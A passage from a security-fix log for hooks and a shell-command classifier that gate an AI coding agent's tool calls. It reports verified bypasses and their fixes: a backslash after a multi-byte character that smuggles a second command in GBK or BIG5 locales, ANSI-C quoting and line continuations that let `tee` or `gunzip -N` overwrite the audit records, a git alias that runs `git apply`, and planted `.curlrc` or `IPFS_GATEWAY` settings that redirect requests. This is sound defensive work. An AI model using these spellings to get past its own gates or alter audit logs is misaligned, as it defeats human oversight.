`send` alone).

- Fix (mapper): a class narrower than the worst case comes only from the
  command's program, its first word as the shell passes it: the local file
  programs by word (`rm`, `rmdir`, `mv`, `chmod`, `chown`, `ln`, `unlink`,
  `shred`, with an argument; a quoted `'rm -rf'` or `RM` is no longer one),
  the local git changes by word (`_local_git_change`: `git reset`, `git
  checkout --`, `git clean`, `git branch -d|-D`, every `git stash` form), and
  the network and remote-mutation patterns matched from the start of the
  words (`re.match`, case-sensitive). The interpreter pattern still matches
  anywhere (a program that runs another, `env` or `xargs`, may run it), and
  `_worst_case(capability)` now always holds `mutate` and `send` with
  `capability` first, so a match can only add `execute`. A program that
  sends is `send` and `mutate` (`curl -o`, `scp` and `rsync` write local
  files): no pattern result lacks a capability the worst case has, but the
  local mutations the program itself names. `cp` is no longer read as a
  local mutation: its alternative (`cp\s+.*\s+/` followed by a blank)
  matched only a word that is `/` alone, so it already took the worst case.
- Consequence: a read-only command whose argument holds such text (`grep
  'git reset' f`, `git log --grep='docker rm'`) now observes (it was gated:
  the argument set the class), and an interpreter found anywhere is
  `execute`, `mutate`, `send`, so a profile's rule for `mutate` applies to it.
- Tests: `TestArgumentText` (ten decoys keep the worst case; every base
  program × 14 texts × 2 quotings keeps every capability it has alone; the
  program gives the class; a quoted or upper-case program name is no
  program; F504 under a policy with approvals `ask` and `off`; the plugin
  hook gates them), the reported lines added to
  `test_a_command_that_may_send_is_f504_under_a_policy`, and a 4096-byte
  line of decoys classified in bounded time.

#### 2. `sed -i`, `docker rm|rmi|prune` and the git changes where git fetches or runs a hook were local `mutate` (medium)

`sed -i` runs a command through GNU sed's `e` command or `s///e` flag
(verified: both wrote their sentinel); `docker rm|rmi|prune` sends its
request to the daemon `DOCKER_HOST` or the docker context names (verified:
a listener on `DOCKER_HOST` logged `DELETE /v1.xx/containers/<name>`); in a
partial clone `git reset --hard HEAD~1` and `git reset HEAD~1` fetched the
objects they lacked (verified: missing objects went from 1 to 0), and `git
stash apply <a commit not in the clone>` fetched. Each was `mutate` alone.

- Fix (mapper): `sed` (`-i` or not) and `docker rm|rmi|prune` are on no
  list: the worst case, as `sed` and the other docker commands already
  were. A local git change takes the worst case where `_git_change_gated`
  holds: what `_git_read_gated` asks (a git directory that may be content, a
  program the configuration names, a partial clone or submodules) or a hook
  git runs on such a change (`git_change_may_run`: `post-index-change`,
  `reference-transaction`, `post-checkout`; found by running every hook git
  documents on each form: `git reset` and `git stash` run
  `post-index-change` and `reference-transaction`, `git branch -d` and `git
  stash drop` `reference-transaction`, `git checkout --` `post-checkout` and
  `post-index-change`, `git clean` none; git-lfs installs a `post-checkout`
  that fetches). `git_config_may_run` and `git_change_may_run` share one
  lookup (`_repository_runs`) and differ in the hooks they look for.
- Sibling (fixed): batch 1 made a recorded restore a gated `mutate` where
  the configuration names a program (a smudge filter, a merge driver); that
  program may send anywhere, so the restore now takes the worst case, as
  the reads there do (it is the hook's gated `mutate` there too: the hook
  applies no destination policy).
- Kept: `git stash create` and the restore of a recorded checkpoint keep
  their classes in a partial clone (a probe fetched nothing for either; a
  recorded restore ran only `post-index-change`, which
  `git_config_may_run` already counts).
- Tests: `TestLocalChangesThatReachFurther` (the fixtures above; ten sed and
  docker forms take the worst case; nine git changes in a partial clone take
  it and stay `mutate` in a plain repository; three hook fixtures run their
  hook and take it; a `pre-commit` hook gates nothing; a failed lookup is a
  yes; F504 under a policy). Batch 1's expectations made stricter:
  `git stash create` there is `checkpoint, execute, mutate, send`, a
  recorded restore there `mutate, send`, and `python3 -c` and `curl -X POST
  ... -d` gained `mutate`.

#### 3. A backslash after some UTF-8 characters is half a character in a double-byte locale (medium)

The mapper reads the command as Unicode text; bash reads its bytes in the
user's locale. In GBK, GB18030, BIG5 or Shift JIS, the last byte of some
characters' UTF-8 form is a first byte whose second byte may be 0x5C, the
backslash: `ls ぁ\;touch pwned.txt` is one `ls` to the mapper and `ls ぁ\`
then `touch pwned.txt` to bash (verified with locales built by `localedef`:
GBK and BIG5 created the file, `C` did not; the double-quoted form `ls
"ぁ\";touch pwned_dq #"` too). The adapter allowed it as `observe`.

- Fix (mapper `_simple_commands`): a line with a backslash right after a
  character outside ASCII cannot be read (the worst case), wherever it is.
  Why that suffices: a second byte is 0x40 or above (0x30 to 0x39 in a
  GB18030 four-byte form), so the only byte bash can take from the line is
  one of `@`, letters, digits, `[ \ ] ^ _ { | } ~` and the backtick; every
  one of them but the backslash only takes an operator, a glob or a quote
  from bash, which then runs fewer commands than the mapper read; only a
  backslash bash does not see makes the next character active. A backslash
  after an ASCII character is not affected (a second byte follows a first
  byte of 0x81 or above, and no ASCII character is one).
- The plugin hook already refuses any `\` (a test keeps it so for these
  lines).
- Tests: `TestDoubleByteLocales` (bash in GBK and BIG5 runs the second
  command, in `C` it does not; six lines take the worst case; five lines
  with such characters but no backslash right after one still observe;
  F501 without a checkpoint, F504 under a policy; the plugin hook's F501).

#### 4. `pip` was missing from `_ARGUMENT_WRITERS` (medium)

Round 2 put `pip list` and `pip show` on the allow-list, read-only with the
options `_SUBCOMMAND_OPTIONS` lists, but a word the shell expands was read as
the literal `*`: `pip show *` in a directory holding a file named
`--log=pwned-by-glob.log` wrote that log (verified with pip 24.0), and
`--proxy=...` in a file name makes pip ask that host.

- Fix (mapper): `pip` joins `_ARGUMENT_WRITERS`; every command whose
  options `_writes` reads is now there (checked: the allow-list's other
  commands, `ls`, `cat`, `grep`, `wc` and the rest, have no option that
  writes, runs or sends). The plugin hook does not list `pip`.
- Tests: `TestPipGlobs` (five glob forms take the worst case; `pip show *`
  writes the log a file name names; the plugin hook gates it), and `pip show
  *` and `pip list *` added to
  `test_arguments_the_classifier_does_not_take_as_read_only`.

#### 5. The persist hook worked out the file after an Edit differently from Claude Code (medium)

The hook read the target's raw bytes and applied old_string/new_string with
its own rules; Claude Code 2.1.330 (read in its binary, not run) reads a file
opening with FF FE as UTF-16LE, turns CRLF into LF before matching, removes
`old_string` with the line break after it when `new_string` is empty
(`bos`/`Uur`), and finds a non-ASCII `old_string` as the file's `\uXXXX`
escapes (and an escape in `old_string` as the character), escaping
`new_string` to match (`Vrt`, `de`). Where the hook found no `old_string` it
scanned only the carried text: a CRLF file with an `old_string` spanning a
line break, a UTF-16LE file, two Edits whose second deletes `DELETE-ME` and
so joins `password: "` to its value, and a JSON file whose `café` is
`café` each stored a password the scan recognises.

- Fix (`skills/persist/SKILL.md`): the file is read as Claude Code reads it
  (FF FE: converted with `iconv`, refused R407 without it; CRLF read as LF);
  each edit is applied as Claude Code applies it (as written, else with
  curly quotes read as straight ones; the empty-`new_string` rule; first or
  all occurrences); an `old_string` an existing file holds in neither form
  is refused (R407, a message of its own, by jq's `halt_error(3)`): Claude
  Code may still find it through an escape, and the hook cannot tell what
  the file will hold. A file that does not exist is read as empty, as
  before (Claude Code fails such an Edit).
- Sibling (fixed, time): every `join` in the hook's jq is now `joined`, which
  is linear (`add` over the pieces): jq 1.7's `join` copies what it has
  built at each piece, so reading a 1 MB file of CRLF lines as LF took
  3.4 s and a 4 MB one about a minute, past the hook's 30 s limit (which
  blocks the call), and a 1.4 MB Write of 32,000 new lines took 2.2 s (now
  0.7 s).
- Not changed: the audit skill's Edit hook refuses any edit of the records
  file whatever it holds; the SDK adapter and the binding apply no file
  edit (their `persist` checks read the call's data).
- Tests: `test_reads_the_file_as_claude_code_edits_it` (CRLF, UTF-16LE, the
  two-call empty-`new_string` sequence, the file written between calls as
  Claude Code would), `test_refuses_an_old_string_it_does_not_find` (an
  escape in the file, an escape in `old_string`, an absent `old_string`,
  each as Edit and MultiEdit; the absent case moved here from the allow
  test, where it was allowed), `test_a_utf16_file_needs_iconv`,
  `test_a_file_that_is_not_there_is_read_as_empty`, a control for the
  empty-`new_string` rule, two allow cases (a CRLF and a UTF-16LE edit
  that adds no credential) and a bounded-time test (a 4 MB CRLF file and
  Write, each under 15 s), in sh and bash.

#### Siblings checked

- Batch 1 and rounds 1 and 2 hold: their tests pass (three expectations
  stricter, above); the quoted-operator reading, the 4096-byte bound (a
  4096-byte decoy line classifies in bounded time), `printf -v`, the
  partial-clone and configured-program reads.
- Other narrowing classes: `observe` (the allow-list, `_writes`) and the
  `git stash` line-of-one classes read words, not joined text; the remote-
  mutation pattern gave the worst case anyway and is now anchored too.
- The TypeScript package and the binding classify no shell command and edit
  no file; the plugin hook gates every line above as `mutate` (it applies no
  destination policy) and refuses any backslash.

#### Documentation

SECURITY.md (§5.4's persist row; §5.5's paragraph on the adapter's Bash
classifier), `docs/integrations/claude_agent_sdk.md` (the Bash
classification text and table: classes from the program only, `sed -i`,
`docker rm`, the local git changes and `git_change_may_run`, `execute,
mutate, send` and `send, mutate`, the backslash rule, `pip` globs), the
mapper's comments and docstrings, the persist hook's comment, and
CHANGELOG [Unreleased] Upgrading (the SDK's Bash entry; the plugin's
persist entry). No version changes.

#### Checks after batch 2

- Python: `pytest tests/` (6354 passed, 18 skipped), and again the eight
  affected files after the last hook edit (2033 passed); ruff check and
  format with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators' `--check`
  (no fixture or vector changed); `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: `packages/acs-core` build, check and test (2007); the
  binding's check and test (235 passed, 2 skipped). No TypeScript source
  changed: neither classifies shell commands nor edits files.
- Site: `npm run check`, `npm test` (1173).
- Old code: the new mapper tests with 3ecf6aa's mapper (82 of 119 failed)
  and the new persist tests with 3ecf6aa's hook (14 failed), above.
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs of
  at most 1.5 MB: every reported line through `map_tool` before and after
  (all now the worst case or stricter); the persist hook on 1 MB of CRLF
  lines (3.5 s with jq's join, 0.4 s with the linear one, linear from 256
  KB to 1 MB) and a 1.4 MB Write (2.2 s before, 0.7 s after). No CLI or nested
  agent was started (Claude Code's edit functions were read in its binary
  with `grep`); the docker listener and every other process were stopped;
  the scratch repositories, locales and inputs were removed.

### Batch 3: four reported defects

Four defects, each reproduced by an independent verifier on 6004f78 and
reproduced again here on 6b41119 (batch 2's commit) before any change: two
in the audit skill's command hook, one in the send skill's, and one in how
the TypeScript package and the Python MCP factory read a carrier of a tool
binding record. None was fixed by an earlier batch (git log and rounds 1 to
3 checked; batches 1 and 2 changed no skill hook but persist's and no
carrier). Each fix has tests that fail on the code before it: the new skill
hook tests run against 6b41119's hooks in a scratch tree (the test file,
its fixtures, the hooks and the skills, 4.7 MB, removed) gave 132 failures
of 198 (audit) and 88 of 154 (send and rollback); what passed is the
controls (commands each hook must leave alone, the moves the new mv rule
allows) and sibling forms the old hooks refused for another reason (a
literal `.claude` beside `$"..."`, a `$` in a path). The new TypeScript
test fails with 6b41119's `annotationRecord` (1 of 81 in the package; 3 of
95 in the binding's three files), and the Python factory tests with
6b41119's `mcp.py` (4 of 5; the fifth is the control).

The skill hooks are host-specific narrowings (§5.18.10's last paragraph);
the plugin's pre-tool-use hook gates every reported command as a `mutate`
(or `send`) a person approves. Each defect is a hook that did less than
SECURITY.md §5.4 says.

#### 1. The audit hook's gate did not read `$'...'`, so a records path spelled with ANSI-C quoting skipped every check (medium); siblings: escaped quotes, line continuations, command substitutions, the send and rollback gates

The gate looked for `records|jsonl|audit|\.claude` with quotes and
backslashes removed; `$'\x2ecla\x75de/a\x75dit/rec\x6frds.js\x6fnl'` and the
octal form spell the path with none of them, and `tee` and `cp` are not on
the writer list, so `tee -a $'...'` appended a token to the records file
(bash, verified). Siblings found here, each exit 0 on 6b41119:

- the shared word reader (`hooks/shell_words.jq`) did not pair quotes as
  bash does: an escaped quote (`echo "\"" ; git apply p ; echo "\""`,
  `echo \' ; ...`, `echo $'\'' ; ...`) made it read the commands after it
  as one quoted word, so the audit hook's rules for every command (the
  writer list, the glob that may name the file) did not see `git apply`
  or `tee -a .c*/a*/r*`; a backslash in a name stayed in the word
  (`pat\ch` was not `patch`);
- a line continuation split a name the gates look for (the `tr` they use
  reads lines): `tee -a .cl\<nl>aude/au\<nl>dit/rec\<nl>ords.js\<nl>onl`
  (audit), `cu\<nl>rl 127.0.0.1:18777/` (send: no address check at all),
  `git sta\<nl>sh apply <unrecorded>` and `git $\<nl>'\x73tash' apply`
  (rollback; bash restores);
- the writer rule did not read a command substitution's command (`` echo
  `git apply p` ``, `` x=`git apply p` ``, `echo "$(git apply p)"`), nor the
  commands after quotes nested inside one (`echo "$(echo '"')"; git apply
  p; echo '"'`);
- the reader's operator pattern took the digits after any `>` as a file
  descriptor (`>2` read as an operator with no target).

- Fix (shared reader, all four copies): words and segments pair quotes as
  bash does: a backslash escapes the next character (unquoted, in double
  quotes before `$`, `` ` ``, `"`, `\` or a newline, and in `$'...'`, kept
  whole); a line continuation is removed, also between an operator's
  characters (`<\<nl><` is `<<`) and before a comment; a lone backslash or
  an unclosed `$'` is `bad`. Each word gains `ansi` (it holds `$'...'` or
  `$"..."`, kept as written) and `subst` (a backtick, or `$(` or `${` in
  double quotes). Digits follow only `>&` and `<&`. Checked against bash on
  4000 generated commands (escapes, `$'...'`, `$"..."`, continuations in
  words, operators and before comments, comments, globs): no difference but
  the expansions the reader does not make (`${HOME}`, `$'\x41'`); the old
  reader differed on 416 of 500.
- Fix (audit gate): `$'` or `$"` in the command, or in it with its line
  continuations joined (`$\<nl>'`), sends it to the full reading, which
  refuses `$'...'` and `$"..."` (the `subst` refusal names them); the name
  grep removes line breaks; the writer grep reads the command as written
  and with its line continuations joined (`a\\<nl>tar` keeps the break).
- Fix (audit, every command): where the reader cannot follow the command
  (an unclosed quote, a word with `subst`), it is read again with no
  quoting at all (each real line continuation removed, a backtick read as
  `;`, a `#` as a letter, every quote and backslash removed), which reads
  more commands than bash runs and every one it runs; the writer rule and
  the glob rule apply to both readings. So a command substitution in
  quotes is read; the documented limit drops it.
- Fix (send and rollback gates): the same line-break removal and
  joined-continuation `$'` check; the send hook's glob rule for tool names
  reads the joined text too (`c?\<nl>rl`).
- Tests: `test_blocks_a_name_spelled_with_ansi_c_quoting` (11, the
  reported three and the verifier's siblings), `test_an_ansi_c_spelled_
  name_is_the_records_file` (bash writes the token; the hook refuses
  first), `test_reads_quotes_and_escapes_as_bash_does` (15), and in send
  and rollback the line-continuation and escaped-quote cases.

#### 2. The audit hook's `mv` rule compared base names, so any `records.jsonl` came in as a moved-aside file and the live records could leave (medium); siblings: a moved-aside file named by a glob, programs that write the files their input names

`mv /tmp/x/records.jsonl .claude/audit/records.1.jsonl` and `mv
.claude/audit/records.jsonl /tmp/records.gone.jsonl` passed. The reported
chain (`base64 -d`, `gunzip -N`, `mv`) left a token in
`.claude/audit/records.1.jsonl`; the verifier's escalation then overwrote
the live file with `gunzip -fN -S l .c*/a*/r*1*`, whose glob `may_name`
did not read (it matched only `records.jsonl` as the last component).

- Fix (mv): both operands, resolved from the call's directory with
  `${CLAUDE_PROJECT_DIR:-.}` at the start read as the project's directory
  (the hook's `CLAUDE_PROJECT_DIR`, else the call's directory), must be in
  `<project>/.claude/audit`, the source `records.jsonl`, the target
  `records.<x>.jsonl`; a `..`, a `~`, an expansion, a glob, a brace or
  `$'...'` is refused. Both operands with the prefix stay in one directory
  whatever the Bash tool's environment expands it to.
- Fix (`may_name`): a glob or a brace that may name any file of
  `.claude/audit` (`.c*/a*/r*1*`) sends the command to the full reading.
- Fix (writers, every command): `gzip`, `gunzip`, `pigz`, `unpigz` with
  `-N`/`--name` (or abbreviated, or in a cluster) or where the command
  names `GZIP` (gzip 1.12 honours `GZIP=-N`, verified); `curl` unless `-q`
  (or `--disable`, or a cluster starting `-q`) is its first word (it reads
  `.curlrc`, which may set `remote-header-name` and `output-dir`) and with
  `-J`, `-K`, `--remote-header-name`, `--config`, `--variable` or
  `--expand-*` (abbreviations read: curl 8.5 takes `--remote-header`);
  `wget` unless given `--no-config` (exact; wget honours it anywhere,
  verified) and with `--content-disposition`, `--trust-server-names`,
  `-r`, `-m`, `-p`, `-x`, `-i`, `-e`, `-B`, `-F`, `--config` and the like;
  HTTPie, `aria2c`, `ditto`, `xar`, `aa`, `aunpack`, `atool`, `dtrx`,
  `patool`; `dpkg -x|-X|-i|-R`, `rpm -i|-U|-F`; `python -m zipfile|tarfile`;
  and a git command that is not one of git's own (git 2.43's list and a
  few later ones): an alias a configuration file or `GIT_CONFIG_*` defines
  runs `git apply` (verified: `[alias] x = apply` in `.git/config`, then
  `git x notes.patch`, wrote the token), and the hook refused only
  `-c alias.*`, `--config-env` and `git config alias.*`. A bare `git` or
  `git --version` is left alone (it was refused, but the gate never read
  it).
- Not changed: package installers' scripts and a program named by a
  variable stay the documented limit (code a script runs, a name built when
  the command runs).
- Tests: the reported moves and ten siblings in
  `test_mv_only_moves_the_records_file_aside`, `test_mv_of_a_path_the_
  shell_builds_is_refused`, `test_mv_moves_the_records_aside_in_their_
  directory` (four allowed forms), `test_blocks_more_programs_that_write_
  files_their_input_names` (31), `test_still_allows_these_commands` (19
  controls, the commit here-document among them), `test_a_name_gunzip_
  restores_is_refused_before_it_runs` (gunzip restores the stored name;
  each step refused) and `test_a_git_alias_from_a_configuration_file_is_
  refused` (the alias applies the patch; the hook refuses first).

#### 3. The send hook never read the setting files curl and wget take at run time; a brace or glob spelling, `~/.ipfs/gateway` and `IPFS_GATEWAY` were not on its lists (medium); siblings: wget's, a Write of the files

`tee ~/.cu{r,r}lrc`, `tee ~/.c*rlrc`, `tee -a /etc/ho{s,s}ts`, `> ~/.ipfs/gateway`
and `tee ~/.wge{t,t}rc` passed, after which a plain `curl` or `wget`
reached a 127.0.0.1 listener; `export IPFS_GATEWAY=http:/127.0.0.1:18777;
curl ipfs://...` did in one command. Reproduced here with a listener (a
`.curlrc` proxy: the plain request logged `GET http://example.com/
Host=example.com`; with `-q` nothing reached it).

- Fix (requests): `curl` runs only with `-q` (or `--disable`) first, `wget`
  only with `--no-config`, HTTPie only where the configuration file it
  reads (`$HTTPIE_CONFIG_DIR`, `$XDG_CONFIG_HOME/httpie` or
  `~/.config/httpie`, and `~/.httpie`) sets no default options (it has no
  option to skip the file; an unreadable file refuses), so no setting file
  can redirect a request whatever wrote it, before the skill ran too; and
  no `ipfs://` or `ipns://` URL (the gateway decides the host). The rule
  applies where the tool runs a request (it is the program, or after one
  that runs another), so `apt-get install curl` and `curl --version` pass.
  Another refusal of the same request is reported first.
- Fix (every command): a glob or a brace that may expand to a setting file
  (`.curlrc`, `.config/curlrc`, `.wgetrc`, `etc/wgetrc`, `etc/hosts`,
  `etc/resolv.conf`, `resolve/resolv.conf`, `.ipfs/gateway`,
  `httpie/config.json`, `.httpie/config.json`: last components matched, a
  leading dot only by a dot, the last pattern holding a letter or a digit)
  is refused; each run's brace words are computed once for this and the
  tool-name rule (distinct runs at the 16384-byte bound: 1.7 s for braces,
  0.9 s for globs).
- Fix (lists): `ipfs` in the gate, `\.ipfs(/|$)` and `httpie/config` in the
  setting files, `IPFS_GATEWAY`, `IPFS_PATH`, `SYSTEM_WGETRC` and
  `HTTPIE_CONFIG_DIR` in the setting variables.
- Fix (new hook): an Edit, Write, MultiEdit or NotebookEdit of those files,
  by the path as written and the file it reaches (links followed), is
  refused (the matcher was Bash only).
- Not changed: a name that resolves to an internal address (a hosts file a
  name built at run time writes) stays the documented limit; the plugin
  applies no destination policy, so §4.4.2 binds no destination here.
- Tests: `test_blocks_a_setting_file_however_it_is_named` (12),
  `test_blocks_a_request_a_configuration_or_a_gateway_redirects` (15),
  `test_curl_reads_its_configuration_file_unless_given_q_first` (the
  fixture's own check, offline), `test_httpie_runs_only_without_default_
  options` (5 configurations × 2 directories), `test_an_edit_of_a_setting_
  file_is_refused` (14 paths × 3 tools), `test_an_edit_through_a_link_to_a_
  setting_file_is_refused`. Tests changed to the new rule: the allowed
  request examples now run `curl -q` and `wget --no-config` (and the audit
  hook's allowed `curl` with a secret header, `curl -q`); the refusal of
  the plain forms is in the new tests.

#### 4. An annotation (or MCP metadata) was read in part: an unknown member was dropped, not S303 (medium)

`annotationRecord` copied only the record's members and `x-` keys, so
`{capability: 'retrieve', aproval: {...}}` or `flag: {...}` loaded as a
plain retrieve: a composite's nested call of such a tool ran with no
approval, checkpoint or destination check, `lintPromptTools` passed it and
`deriveAgentManifest` understated the agent. The Python factory's `_record`
did the same with MCP metadata.

- Fix (TypeScript): `annotationRecord` passes every member but the copies
  (`tool`, `layer`, `risk`, `mutation`, `requires_checkpoint`,
  `requires_approval`) to the record, built with `Object.fromEntries` so a
  member named `__proto__` stays a member; `checkBindings` reports the
  unknown one (S303) and does not load it: V107 in a composite's
  `invokes`, W617 in the lint, a malformed tool in `deriveAgentManifest`.
- Fix (Python): `_record` passes every metadata member but `tool`,
  `capability_id` and the flat flags (which it reads into `capability` and
  `flags`); a metadata `ontology` is now the record's. A tool with no
  capability that is not control-only stays unbound unless its metadata
  holds a member no record has (a misspelt `capabilty`): that record goes
  to the loader, so the factory raises rather than leave the tool unbound
  unnoticed.
- Fixture: `tests/conformance/bindings/unknown_member.json` (a record with
  `aproval` is S303, not loaded), generated by
  `scripts/gen_call_fixtures.py`; both runners count 36 binding fixtures.
- Tests: `annotationRecord` keeps an unknown member (four annotations, the
  `__proto__` one included, each S303; copies and vendor data still load);
  the binding's V107 test (three misspelt records), manifest test (two)
  and lint test (W617); the factory raises S303 for four metadata forms and
  registers nothing, and reads copies, flat flags and vendor data as
  before.

#### Siblings checked

- Rounds 1 to 3 hold: every skill hook test passes (1437), the persist
  hook's reading is unchanged (it does not use the shared reader), and the
  rollback hook's recorded restore still restores (`git stash apply <id>`,
  and `git "stash" apply <id>`).
- The plugin's pre-tool-use hook and the SDK mapper refuse any backslash
  or read the worst case for each reported command; neither reads a carrier
  of an annotation, and the SDK adapter's own records go through the same
  loader (`parse_record`, S303 for an unknown member already).
- The other users of `checkBindings` and `parse_record` take records, not
  carriers, so they read every member already.

#### Documentation

SECURITY.md §5.4 (the audit, send and rollback rows; a row for the send
skill's new Edit and Write hook), the three hooks' header comments,
`hooks/README.md` (the shared reader's quoting), `docs/integrations/
standard_agents.md` (an annotation's unknown member), the factory's
docstring, spec/CONFORMANCE.md (36 binding and 32 call-sequence fixtures;
the counts were stale), and CHANGELOG [Unreleased] Upgrading (the plugin's
skill hooks; the MCP metadata; `annotationRecord`). The Standard's text
was not changed: §5.18.1 already says a carrier is read as the record and
an unknown member is S303. No version changes.

#### Checks after batch 3

- Python: `pytest tests/` (6676 passed, 18 skipped), and again the files
  the last edits touched and every file that reads the docs (1769 passed;
  `tests/test_skill_hooks.py` 1437); ruff check and format with CI's
  lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators'
  `--check` (one binding fixture added, written by its generator);
  `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: `packages/acs-core` build, check and test (2009; the
  WebAssembly build reused); the binding's check and test (236 passed, 2
  skipped).
- Site: `npm run check`, `npm test` (1173; the fixture counts the site
  reads come from tracked files, so the new fixture is added to git first).
- Old code: the new tests against 6b41119's hooks, `annotationRecord` and
  `mcp.py` (above, per defect).
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs
  of at most 1 MB: every reported command against the old hooks (exit 0)
  and the new ones (refused); the reader against bash on 4000 generated
  commands; a listener on 127.0.0.1:18777 reached by a plain `curl`
  through a planted `.curlrc` proxy and not by `curl -q`; `GZIP=-N
  gunzip` restoring a stored name (gzip 1.12); wget honouring
  `--no-config` after the URL and curl `-q` only as the first word. Timing
  at the 16384-byte bound: the audit hook 0.04 to 1.7 s (a backtick word
  per four bytes, which the second reading reads, 1.7 s; the old reader
  took 0.58 s for a word per two bytes), the send hook 0.04 to 1.7 s
  (distinct brace runs 1.7 s, glob runs 0.9 s, a word per three bytes
  1.6 s), a 1 MB command to the audit hook 0.36 s. No CLI or nested agent
  was started; the listener and every other process were stopped; the
  scratch tree, projects and archives were removed.

### Batch 4: five reported defects

Five defects, each reproduced by an independent verifier on 6004f78 and
reproduced again here on 4cec757 (batch 3's commit) before any change: two
in the Standard Agents binding's nested calls (a decoder message that cut a
secret before redaction; checks that threw instead of refusing), and three
in what the Python runner and its host write (the idempotency log, an
event's or a tuple's anchors, a cancel's reason). None was fixed by an
earlier batch: git log and rounds 1 to 3 checked (round 2 #20 added the
nested output check whose decoder message leaked; round 2 #22 recorded the
R407 of a grounded call's secrets function, not a nested call's; round 2
#23 redacted an `Output`'s anchors given as a list, not an `Event`'s or a
tuple; round 1's idempotency fixes kept `evidence_seen` for replay, not
redacted). Each fix has tests that fail on the code before it (below, per
defect, with the controls that pass on both).

#### 1. A nested plain call's non-JSON output put a window of its text into the R402 entry, so part of a registered secret escaped redaction (medium)

`decodeCapabilityOutput` (`packages/acs-core/src/output.ts`) appended V8's
`JSON.parse` message, which quotes the text (all of it up to 20
characters, else about 10 characters around the error). The binding's
nested output check made it the R402 entry's `error`, and redaction ran
after: a registered secret cut by the window no longer matched, so
`"Zq8-rotati"...` stayed in the trace and in `actionRecord`'s
`details.error`; the verifier also showed a password whose member name
the window cut (`..."assword": Tr0ub4dor,"...`), which the name-keyed
pattern no longer recognised.

- Fix: the decoder no longer repeats the parser's message; it says the
  text is not the JSON text of one object and nothing else, and where it
  stops being JSON when the parser says (`(at character N)`, digits read
  from the message, nothing else of it). Python's decoder quoted nothing
  already (`json.loads` messages name positions only; a duplicate member
  is quoted whole, which redaction still matches).
- Vectors (`tests/conformance/output/vectors.json`, both runners): a
  decode vector may state `quotes_nothing_of`, a string the text holds;
  the refusal's message (the diagnostic's text and the thrown error's)
  must hold no piece of four or more characters of it. Three new vectors:
  `text_starting_with_a_secret`, `unquoted_secret_value`,
  `unquoted_password_member`. The three fail on 4cec757's `output.ts` (the
  Python runner passes them on both: its decoder never quoted).
- Binding test (`test/nesting.test.ts`): `keeps no piece of a secret from
  an output that is not JSON in the R402 entry or its action record (§6.7)`
  (the reported probe: a registered secret leading the text, as an
  unquoted value, and an unquoted password): fails on 4cec757's built
  package.
- Siblings checked: the decoder's other messages (a missing field, a
  confidence out of range, the integer beyond ±2^53, a key with a lone
  surrogate) name fields, the whole integer or a whole key; no other
  binding or package path parses host text and keeps the parser's message
  (`parseJsonExact` is used by the fixture runners only), and nothing in
  the binding cuts text before redacting it.

#### 2. A nested plain call refused because the layer could not read its records or arguments threw out of the nesting state: no R407, no record (low; sibling of round 2 #22)

`invokePlain` ran the secret scan (`holdsCredential`), the destination,
approval and prerequisite checks (`readExecuted`) outside any try: a store
read that failed, or arguments the scan cannot walk (a cycle, 20,000
levels of nesting), threw into the composite's code. Nothing ran, but the
layer neither returned §9.8's R407 nor recorded the refused call
(§5.18.8). The grounded branch of the state's `invokeTool` threw the same
way when `digestOf(args)` failed. Found here too: a nested plain call
whose arguments have no canonical JSON and whose capability has no secret
scan (a `retrieve` with a cycle) ran, recorded without an `args_digest`,
where a grounded tool's own check refuses such arguments with R407.

- Fix (`examples/standard_agents/src/acs/grounded.ts`): the checks before
  a nested plain call runs are one function (`checksBefore`), called in a
  try; a check it cannot complete returns `refuseNested('R407', ...)`, a
  `refused` entry with `covered_by` and `recorded_by`, written under
  `serially` and best effort (a `refused` entry reads no `acs:executed`,
  so it is written while that read fails). Arguments with no canonical
  JSON are such a check: the first one, so a plain call with them never
  runs. The grounded branch refuses with R407 too when the digest that
  binds the nesting token cannot be computed, recorded with the covering
  call's `covered_by` while it runs (`recordRefusal` takes the code). A
  refusal names a listed grounded tool's own capability
  (`boundCapability` reads `PERFORMS` of the listed definition before the
  realm-wide name map, which is `null` once two tools of one name
  disagree).
- Tests (`test/nesting.test.ts`, `a nested call the layer cannot check is
  refused and recorded`): a plain `persist` and a plain `retrieve` whose
  `acs:executed` read fails inside the composite, a plain `persist` and a
  plain `retrieve` with cyclic arguments and with arguments nested 20,000
  deep (about 100 KB), a grounded `persist` with cyclic arguments and a
  grounded `retrieve` nested 20,000 deep: each R407, one `refused` entry
  with `covered_by` and `recorded_by`, the tool not run, nothing executed
  but the composite. All 8 fail on 4cec757's `grounded.ts` (the retrieve
  with a cycle ran there); the control (a plain persist the layer can
  check runs and is recorded `executed`) passes on both.
- Siblings checked: `queueTool` reads nothing that can fail; `controlTool`
  is never refused by design and reports a record it cannot write; a
  grounded tool's own `check` has caught these since round 1.

#### 3. IdempotencyLog wrote a send's whole output to its file unredacted, and redacted the destination without the runner's registered secrets (medium)

`perform` stored `response["value"]` and `evidence_seen` as the effect
returned them, and `Host.send_once` calls it inside `invoke_capability`,
before the runner redacts anchors: the log's file kept a presigned URL's
`X-Amz-Credential`, a URL's password and a receipt's bearer token, which
the run itself no longer held. The log redacted only the destination,
with its own redactor (`DEFAULT_REDACTOR` unless the host passed one), so
a secret the runner registered stayed in the destination, and the
rollback's `not_covered` item repeated it (`_transmitted_since` used the
default redactor).

- Fix: the runner's anchor redaction is one function,
  `grounded_agency/workflows/_responses.py` (`redact_anchors`), which the
  runner and the log share. The log keeps a done entry's output as the
  runner submits it (anchors redacted without their digest, `evidence_seen`
  rewritten by the runner's rule, so two anchors one after redaction are
  listed only when the host listed both) and then replaces every other
  secret its redactor recognises in the output and in `evidence_seen`
  (`_kept`); a replay answers with that output. The effect's own response
  is still what the first attempt returns (the runner then redacts its
  anchors as before). `IdempotencyLog.redactor` and `MemoryStore.redactor`
  are properties; `Redactor.include(other)` takes another redactor's
  registered forms and patterns. The runner, at each `advance`, gives what
  its redactor recognises to the host's log, the host's memory store and
  its own `memory` (`_share_redactor`): a store on `DEFAULT_REDACTOR` gets
